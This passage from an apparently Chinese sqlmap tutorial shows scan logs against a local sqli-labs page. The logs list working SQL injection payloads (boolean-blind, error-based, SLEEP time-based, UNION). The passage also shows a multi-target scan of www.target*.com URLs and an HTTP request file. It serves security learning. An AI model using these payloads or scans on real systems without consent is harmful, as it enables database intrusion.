[18:37:17] [INFO] testing 'MySQL inline queries'                                                                                                          
[18:37:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'                                                                                     
[18:37:17] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                   
[18:37:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                                                                                               
[18:37:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
[18:37:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'                                                                                 
[18:37:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                        
[18:37:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'                                                                                  
[18:37:18] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                            
[18:37:28] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                        
[18:37:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                  
[18:37:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found     
[18:37:28] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically e
xtending the range for current UNION query injection technique test                                                                                       
[18:37:28] [INFO] target URL appears to have 3 columns in query                                                                                           
[18:37:28] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                         
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]                                                                  
                                                                                                                                                          
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:                                                                   
---                                                                                                                                                       
Parameter: id (GET)                                                                                                                                       
    Type: boolean-based blind                                                                                                                             
    Title: AND boolean-based blind - WHERE or HAVING clause                                                                                               
    Payload: id=2' AND 7360=7360 AND 'lcZO'='lcZO                                                                                                         
                                                                                                                                                          
    Type: error-based                                                                                                                                     
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)                                                              
    Payload: id=2' AND (SELECT 4240 FROM(SELECT COUNT(*),CONCAT(0x716a787171,(SELECT (ELT(4240=4240,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_
SCHEMA.PLUGINS GROUP BY x)a) AND 'DARZ'='DARZ                                                                                                             
                                                                                                                                                          
    Type: time-based blind                                                                                                                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                                                                                             
    Payload: id=2' AND (SELECT 9537 FROM (SELECT(SLEEP(5)))eRXY) AND 'MqRr'='MqRr                                                                         
                                                                                                                                                          
    Type: UNION query                                                                                                                                     
    Title: Generic UNION query (NULL) - 3 columns                                                                                                         
    Payload: id=-1033' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787171,0x454766684a4352517a444b547a68524a6f744f4e6f7770796e6446515668715a516c424948495449,0
x7176627071)-- -                                                                                                                                          
---                                                                                                                                                       
[18:37:28] [INFO] the back-end DBMS is MySQL                                                                                                              
[18:37:28] [INFO] fetching banner                                                                                                                         
[18:37:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'                          
back-end DBMS: MySQL >= 5.0                                                                                                                               
banner: '5.7.26'                                                                                                                                          
[18:37:28] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'                                         
                                                                                                                                                          
[*] ending @ 18:37:28 /2020-02-25/                                                                                                                        
                                                                                                                                                          
                                                                                                                                                                                                                                                                                                          
1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586
```

其中有：
Type: boolean-based blind表示布尔类型盲注；
Payload: id=2’ AND 7360=7360 AND ‘lcZO’='lcZO表示查询条件，即url后的参数。
用在连接后能正常访问到，如图
![ id=2' AND 7360=7360 AND 'lcZO'='lcZO](https://img-blog.csdnimg.cn/20200227105811186.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
存在sql注入点和动态网页才能访问到，如?后的参数，如id=2与数据库进行了交互，此时才能访问到，如果是静态网页、未与数据库进行交互是探测不到的。
url不能加引号，否则会提示url无效。

#### sqlmap读取不同文件类型进行SQL注入

（1）为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图，参数是 **-x**。
（2）从多行文本格式文件读取多个目标，对多个目标进行探测，参数是 **-m**。
写一个target.txt，内容为：

> www.target2.com/vuln2.asp?id=1
> www.target3.com/vuln3/id/1*
> www.target1.com/vuln1.php?q=foobar

进行测试：

```shell
python sqlmap.py -m "xxx\target.txt" --banner
1
```

打印

```shell
        ___                                                                                                                                                                                                                                  
       __H__                                                                                                                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}                                                                                                                                                                                                     
|_ -| . [.]     | .'| . |                                                                                                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                    
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                  
                                                                                                                                                                                                                                             
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not res
onsible for any misuse or damage caused by this program                                                                                                                                                                                      
                                                                                                                                                                                                                                             
[*] starting @ 19:59:27 /2020-02-25/                                                                                                                                                                                                         
                                                                                                                                                                                                                                             
[19:59:27] [INFO] parsing multiple targets list from 'xxx\targer.txt'                                
[19:59:27] [INFO] found a total of 3 targets                                                                                                                                                                                                 
URL 1:                                                                                                                                                                                                                                       
GET www.target2.com/vuln2.asp?id=1                                                                                                                                                                                                           
do you want to test this URL? [Y/n/q]                                                                                                                                                                                                        
>                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                             
[19:59:29] [INFO] testing URL 'www.target2.com/vuln2.asp?id=1'                                                                                                                                                                               
[19:59:29] [INFO] using 'xxxx\sqlmap\output\results-02252020_0759pm.csv' as the CSV results file in multiple targets mode                                                                                           
[19:59:29] [INFO] testing connection to the target URL                                                                                                                                                                                       
[19:59:30] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[19:59:30] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--ignore-proxy', '--proxy',...)           
[19:59:33] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[19:59:33] [INFO] testing if the target URL content is stable                                                                                                                                                                                
[19:59:34] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[19:59:35] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[19:59:35] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels                                                
[19:59:35] [INFO] testing if GET parameter 'id' is dynamic                                                                                                                                                                                   
[19:59:38] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[19:59:40] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[19:59:40] [WARNING] GET parameter 'id' does not appear to be dynamic                                                                                                                                                                        
[19:59:41] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] y                                                                                                                        
[20:00:20] [CRITICAL] connection timed out to the target URL                                                                                                                                                                                 
[20:00:20] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable                                                                                                                                            
[20:00:20] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:21] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:21] [INFO] testing for SQL injection on GET parameter 'id'                                                                                                                                                                            
[20:00:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                                                                                                                 
[20:00:21] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:22] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:24] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:25] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:25] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:28] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:28] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:30] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:30] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:31] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                                                                                                         
[20:00:32] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:35] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                                                                
[20:00:35] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:37] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:37] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:39] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:39] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:40] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:41] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:42] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:43] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:46] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                                                                                                              
[20:00:46] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:48] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:48] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:50] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:50] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:52] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:52] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:00:53] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:00:54] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:01:25] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests                                                                                                                                   
[20:01:25] [CRITICAL] connection timed out to the target URL                                                                                                                                                                                 
[20:01:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                                                                                        
[20:01:25] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:01:26] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:01:27] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:01:29] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:01:29] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:00] [CRITICAL] connection timed out to the target URL                                                                                                                                                                                 
[20:02:04] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:05] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:06] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:08] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                                                                                                        
[20:02:08] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:10] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:10] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:41] [CRITICAL] connection timed out to the target URL                                                                                                                                                                                 
[20:02:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:43] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:43] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:44] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:45] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:47] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:47] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'                                                                                                                                                             
[20:02:47] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:49] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:49] [INFO] testing 'Generic inline queries'                                                                                                                                                                                           
[20:02:52] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:53] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:53] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                                                                                                                                       
[20:02:53] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)                                                                       
[20:02:54] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:56] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:57] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:02:57] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session 
-technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')                                                                                                                                                     
[20:02:58] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:02:58] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:03] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:04] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:07] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                                                                                                            
[20:03:08] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:39] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:40] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:42] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:43] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:43] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:45] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:45] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                                                                                                     
[20:03:45] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:48] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:48] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:49] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:50] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:53] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:53] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:55] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                                                                                                               
[20:03:55] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:56] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:58] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:03:58] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:03:59] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:01] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:02] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:03] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:04] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:05] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:05] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                                                                                                                                                                            
[20:04:06] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:09] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:10] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:12] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:15] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:17] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:47] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:48] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'                                                                                                                                                                
[20:04:49] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:50] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:50] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:51] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:52] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:53] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:54] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:55] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:55] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:04:56] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:04:56] [INFO] testing 'Oracle AND time-based blind'                                                                                                                                                                                      
[20:04:56] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:05:00] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:05:01] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:05:02] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:05:02] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:05:04] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:05:04] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:05:07] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:05:07] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:05:08] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y                                                                    
[20:09:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'                                                                                                                                                                     
[20:09:49] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:09:50] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:09:50] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:09:52] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:09:52] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:09:54] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:09:56] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:09:57] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:09:58] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[20:09:59] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[20:09:59] [WARNING] GET parameter 'id' does not seem to be injectable                                                                                                                                                                       
[20:09:59] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.
. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next URL                                                                                                 
URL 2:                                                                                                                                                                                                                                       
GET www.target3.com/vuln3/id/1*                                                                                                                                                                                                              
do you want to test this URL? [Y/n/q]                                                                                                                                                                                                        
> y                                                                                                                                                                                                                                          
[20:10:07] [INFO] testing URL 'www.target3.com/vuln3/id/1*'                                                                                                                                                                                  
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] y                                                                                                                                                     
[20:10:12] [INFO] testing connection to the target URL                                                                                                                                                                                       
[20:10:15] [CRITICAL] page not found (404)                                                                                                                                                                                                   
[20:10:15] [WARNING] HTTP error codes detected during run:                                                                                                                                                                                   
404 (Not Found) - 1 times                                                                                                                                                                                                                    
URL 3:                                                                                                                                                                                                                                       
GET www.target1.com/vuln1.php?q=foobar                                                                                                                                                                                                       
do you want to test this URL? [Y/n/q]                                                                                                                                                                                                        
> y                                                                                                                                                                                                                                          
[20:10:20] [INFO] testing URL 'www.target1.com/vuln1.php?q=foobar'                                                                                                                                                                           
[20:10:20] [INFO] testing connection to the target URL                                                                                                                                                                                       
got a 302 redirect to 'http://1223.dragonparking.com/?site=www.target1.com'. Do you want to follow? [Y/n] y                                                                                                                                  
[20:10:35] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests                                                                                                              
[20:10:35] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                                                                                                                
[20:10:46] [INFO] testing if the target URL content is stable                                                                                                                                                                                
[20:10:59] [WARNING] GET parameter 'q' does not appear to be dynamic                                                                                                                                                                         
[20:11:00] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable                                                                                                                                             
[20:11:05] [INFO] testing for SQL injection on GET parameter 'q'                                                                                                                                                                             
[20:11:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                                                                                                                 
[20:13:08] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'                                                                                                                                                         
[20:13:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                                                                                
[20:13:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                                                                                                                                              
[20:14:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                                                                                        
[20:14:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                                                                                                        
[20:16:16] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'                                                                                                                                                             
[20:16:19] [INFO] testing 'Generic inline queries'                                                                                                                                                                                           
[20:16:22] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                                                                                                                                       
[20:16:22] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)                                                                       
[20:17:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                                                                                                            
[20:17:34] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                                                                                                     
[20:17:58] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                                                                                                                                                               
[20:19:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                                                                                                                                                                            
[20:20:50] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'                                                                                                                                                                
[20:21:08] [INFO] testing 'Oracle AND time-based blind'                                                                                                                                                                                      
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]                                                                      
                                                                                                                                                                                                                                             
[20:21:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'                                                                                                                                                                     
[20:23:13] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test                
[20:26:48] [INFO] target URL appears to have 219 columns in query                                                                                                                                                                            
[20:26:48] [WARNING] applying generic concatenation (CONCAT)                                                                                                                                                                                 
[20:39:22] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests                                                                                                                                   
[20:39:22] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                                                                                                        
[20:41:18] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                                                                                                        
[20:45:14] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                                                                                                        
[21:10:38] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                                                                                                        
[00:25:30] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[00:25:31] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[00:25:31] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[00:25:31] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[00:25:31] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
[00:25:31] [CRITICAL] unable to connect to the target URL                                                                                                                                                                                    
[00:25:31] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                                                                                                           
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N]                                                                                                                          
                                                                                                                                                                                                                                             
[00:25:31] [ERROR] user quit                                                                                                                                                                                                                 
                                                                                                                                                                                                                                             
[*] ending @ 00:25:31 /2020-02-26/                                                                                                                                                                                                           
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255
```

此时，显然时间更长。
（3）可以将一个HTTP请求保存在文件中，然后使用参数 **-r**。

通过下图所示方式![获取http请求内容](https://img-blog.csdnimg.cn/20200227110608637.gif#pic_center)
并保存到target.txt中，内容示例如下：

> GET /sqli-labs/Less-2/?id=3 HTTP/1.1
> Host: 127.0.0.1
> Connection: keep-alive
> Pragma: no-cache
> Cache-Control: no-cache
> Upgrade-Insecure-Requests: 1
> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36
> Sec-Fetch-Dest: document
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
> Sec-Fetch-Site: none
> Sec-Fetch-Mode: navigate
> Sec-Fetch-User: ?1
> Accept-Encoding: gzip, deflate, br
> Accept-Language: zh-CN,zh;q=0.9
> Cookie: csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF; PHPSESSID=e0c8pbo1jmiji6fjb5gl5e0nug

进行测试：

```shell
python sqlmap.py -r "xxx\target.txt" --banner
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [.]     | .'| . |                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 19:20:12 /2020-02-25/                                                                                                                      
                                                                                                                                                          
[19:20:12] [CRITICAL] specified HTTP request file 'xxx\target.txt' does not exist                                                                                  
                                                                                                                                                          
[*] ending @ 19:20:12 /2020-02-25/                                                                                                                        
                                                                                                                                                          
